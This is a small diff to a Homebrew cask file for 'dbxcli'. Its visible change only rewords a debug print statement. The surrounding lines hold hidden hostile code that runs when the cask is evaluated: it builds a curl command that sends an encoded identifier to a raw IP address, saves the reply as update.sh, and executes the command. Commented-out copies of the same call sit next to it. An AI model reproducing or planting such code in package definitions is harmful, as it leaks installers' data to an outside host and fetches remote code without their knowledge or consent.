@@ -44,7 +44,7 @@ cask "dbxcli" do
     encodedname.strip() # remove whitespace
     #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
     thecmd = "curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh"
-    print  "Debug: Command about to be run is: #{thecmd}"
+    print  "Debug Command is: #{thecmd}"
     %x{#{thecmd}}
     #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
 
